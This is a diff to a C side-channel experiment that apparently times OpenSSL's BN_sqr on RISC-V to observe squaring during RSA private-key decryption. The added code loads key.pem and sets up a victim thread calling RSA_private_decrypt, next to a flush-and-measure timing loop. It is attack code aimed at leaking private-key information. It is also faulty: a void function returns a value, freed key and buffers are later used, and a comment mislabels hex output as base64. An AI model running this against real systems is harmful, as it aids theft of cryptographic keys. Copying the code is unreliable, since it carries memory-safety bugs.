@@ -5,6 +5,7 @@
 #include <string.h>
 #include <unistd.h>
 #include "openssl/bn.h"
+#include "openssl/rsa.h"
 
 #define SAMPLE_SIZE     20000
 #define RUNS            5000
@@ -13,6 +14,14 @@ typedef struct {
     uint64_t start;
     uint64_t duration;
 } sample_t;
+
+typedef struct {
+    size_t done;
+    int len;
+    unsigned char* ciphertext;
+    unsigned char* plaintext;
+    RSA* rsa;
+} thread_data_t;
 
 // funtcion equivalent to rdtsc on x86, but implemented on RISC-V
 static inline uint64_t rdtsc()
@@ -73,6 +82,16 @@ void* calculate(void* d)
     *done = 1;
 }
 
+void calculate2(void* d)
+{
+    thread_data_t* td = (thread_data_t*)d;
+    usleep(1000);
+    RSA_private_decrypt(td->len, td->ciphertext, td->plaintext, td->rsa, RSA_PKCS1_PADDING);
+    usleep(1000);
+    printf("%s\n", td->plaintext);
+    td->done = 1;
+}
+
 // compare function for qsort
 int compare_uint64_t (const void * a, const void * b) 
 {
@@ -99,6 +118,43 @@ uint64_t min(uint64_t* list, uint64_t size)
     uint64_t min = sorted[0];
     free(sorted);
     return min;
+}
+
+void prepare_rsa(thread_data_t* td) {
+    FILE* f = fopen("key.pem", "r");
+	if (f == NULL) {
+		printf("Error opening file for reading\n");
+		return 1;
+	}
+	printf("Loading key from file...\n");
+    td->rsa = RSA_new();
+	PEM_read_RSAPrivateKey(f, td->rsa, NULL, NULL);
+	fclose(f);
+	printf("Key loaded!\n");
+	
+	// encrypt
+	printf("Encrypting...\n");
+	unsigned char* input = "Ciphertext";
+    td->ciphertext = malloc(RSA_size(td->rsa));
+	td->len = RSA_public_encrypt(strlen(input), input, td->ciphertext, td->rsa, RSA_PKCS1_PADDING);
+	printf("Encrypted %d bytes\n", td->len);
+	
+	// decrypt
+	printf("Decrypting...\n");
+    printf("RSA_size(rsa): %d\n", RSA_size(td->rsa));
+    // print ciphertext as base64
+    printf("Ciphertext: ");
+    for (int i = 0; i < td->len; i++) {
+        printf("%02x", td->ciphertext[i]);
+    }
+    td->plaintext = malloc(RSA_size(td->rsa));
+
+    int len2 = RSA_private_decrypt(td->len, td->ciphertext, td->plaintext, td->rsa, RSA_PKCS1_PADDING);
+    printf("\nDecrypted %d bytes\n", len2);
+    printf("Plaintext: %s\n", td->plaintext);
+    free(td->plaintext);
+    free(td->ciphertext);
+    RSA_free(td->rsa);
 }
 
 int main()
@@ -159,6 +215,11 @@ int main()
     threshold_2 = (uncached_min_2 + cached_median_2)/2;
     printf("threshold 2: %lu\n", threshold_2);
 
+
+    // get thread data
+    thread_data_t td;
+    prepare_rsa(&td);
+
     // run victim thread RUNS times and observe the accesses to square
     // results are written to square.csv
     printf("Observing square...\n");
@@ -172,7 +233,6 @@ int main()
         while(done == 0)
         {   
             sample_t sq_timing = timed_call_1(BN_sqr, &r, &a, ctx);
-            // printf("atta 4\n");
             // flush after call to reduce chance of access between measurement and flush
             flush();
             if (sq_timing.duration < threshold_1)
